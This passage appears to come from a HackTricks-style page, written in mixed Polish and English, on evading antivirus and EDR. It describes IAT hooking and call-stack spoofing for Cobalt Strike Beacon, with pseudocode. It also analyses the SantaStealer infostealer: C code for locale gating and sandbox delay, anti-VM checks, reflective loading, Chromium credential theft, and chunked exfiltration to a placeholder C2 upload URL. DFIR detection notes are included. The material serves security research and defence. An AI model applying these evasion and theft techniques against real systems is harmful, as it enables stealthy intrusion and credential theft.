  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Dlaczego IAT hooking tutaj
- Działa dla dowolnego kodu, który używa hookowanego importu, bez modyfikowania kodu narzędzia lub polegania na Beacon jako proxy dla konkretnych API.
- Obejmuje post‑ex DLLs: hookowanie LoadLibrary* pozwala przechwycić ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i zastosować te same maskowanie/stack evasion do ich wywołań API.
- Przywraca niezawodne użycie poleceń post‑ex tworzących procesy przeciwko detekcjom opartym na call‑stack, przez opakowanie CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj poprawkę po relocacjach/ASLR i przed pierwszym użyciem importu. Reflective loaders takie jak TitanLdr/AceLdr demonstrują hookowanie podczas DllMain ładowanego modułu.
- Keep wrappers małe i bezpieczne dla PIC; rozwiąż prawdziwe API przez oryginalną wartość IAT, którą przechwyciłeś przed patchowaniem, lub przez LdrGetProcedureAddress.
- Używaj przejść RW → RX dla PIC i unikaj pozostawiania writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs budują fałszywy łańcuch wywołań (adresy powrotu wskazujące na benign modules), a następnie pivotują do prawdziwego API.
- To omija wykrycia, które oczekują kanonicznych stosów z Beacon/BOFs do wrażliwych API.
- Łącz z stack cutting/stack stitching, aby wylądować wewnątrz oczekiwanych ramek przed prologiem API.

Integracja operacyjna
- Prepend the reflective loader do post‑ex DLLs, tak aby PIC i hooki inicjalizowały się automatycznie przy ładowaniu DLL.
- Użyj skryptu Aggressor do rejestracji docelowych API, aby Beacon i BOFs transparentnie korzystały z tej samej ścieżki unikania bez zmian w kodzie.

Uwagi dotyczące wykrywania/DFIR
- IAT integrity: wpisy rozwiązywane do non‑image (heap/anon) adresów; okresowa weryfikacja wskaźników importu.
- Stack anomalies: adresy powrotu nie należące do załadowanych obrazów; nagłe przejścia do non‑image PIC; niespójne pochodzenie RtlUserThreadStart.
- Loader telemetry: zapisy w procesie do IAT, wczesna aktywność DllMain modyfikująca import thunks, nieoczekiwane regiony RX tworzone przy ładowaniu.
- Image‑load evasion: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania automation/clr assemblies skorelowane z memory masking events.

Powiązane elementy i przykłady
- Reflective loaders wykonujące IAT patching podczas ładowania (np. TitanLdr, AceLdr)
- Memory masking hooks (np. simplehook) oraz stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (np. Draugr)

## SantaStealer — techniki dla Fileless Evasion i kradzieży poświadczeń

SantaStealer (aka BluelineStealer) ilustruje, jak nowoczesne info‑stealery łączą AV bypass, anti‑analysis i dostęp do poświadczeń w jednym workflow.

### Keyboard layout gating & sandbox delay

- Flaga konfiguracyjna (`anti_cis`) enumeruje zainstalowane układy klawiatury przez `GetKeyboardLayoutList`. Jeśli wykryty zostanie układ cyrylicy, próbka upuszcza pusty marker `CIS` i kończy działanie przed uruchomieniem stealers, zapewniając, że nigdy nie detonuje na wyłączonych lokalizacjach, pozostawiając jednocześnie artefakt do polowań.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Warstwowa `check_antivm` logika

- Wariant A przeszukuje listę procesów, hashuje każdą nazwę przy użyciu niestandardowego rolling checksum i porównuje ją z osadzonymi blocklists dla debuggers/sandboxes; powtarza checksum dla nazwy komputera i sprawdza katalogi robocze takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (process-count floor, recent uptime), wywołuje `OpenServiceA("VBoxGuest")` aby wykryć VirtualBox additions, i wykonuje timing checks wokół sleepów, żeby wykryć single-stepping. Każde trafienie przerywa działanie zanim moduły się uruchomią.

### Fileless helper + double ChaCha20 reflective loading

- Główny DLL/EXE osadza Chromium credential helper, który jest albo zapisany na dysk, albo ręcznie mapowany w pamięci; tryb fileless sam rozwiązuje importy/relokacje, więc żadne artefakty helpera nie są zapisywane.
- Ten helper przechowuje DLL drugiego etapu zaszyfrowany dwukrotnie ChaCha20 (dwa 32-bajtowe klucze + 12-bajtowe nonces). Po obu przebiegach dokonywany jest reflective load blobu (bez `LoadLibrary`) i wywoływane są eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Routines ChromElevator używają direct-syscall reflective process hollowing do wstrzyknięcia do działającej przeglądarki Chromium, dziedziczenia AppBound Encryption keys i odszyfrowania passwords/cookies/credit cards bezpośrednio z baz SQLite pomimo ABE hardeningu.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iteruje globalną tabelę wskaźników funkcji `memory_generators` i uruchamia po jednym wątku na każdy włączony moduł (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Każdy wątek zapisuje wyniki do współdzielonych buforów i raportuje liczbę plików po ~45s join window.
- Po zakończeniu wszystko jest spakowane przy użyciu statycznie linkowanej biblioteki `miniz` jako `%TEMP%\\Log.zip`. `ThreadPayload1` następnie sleepuje 15s i przesyła archiwum w kawałkach po 10 MB via HTTP POST na `http://<C2>:6767/upload`, podszywając się pod boundary `multipart/form-data` przeglądarki (`----WebKitFormBoundary***`). Każdy chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opcjonalne `w: <campaign_tag>`, a ostatni chunk dopisuje `complete: true`, żeby C2 wiedział, że składanie jest zakończone.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
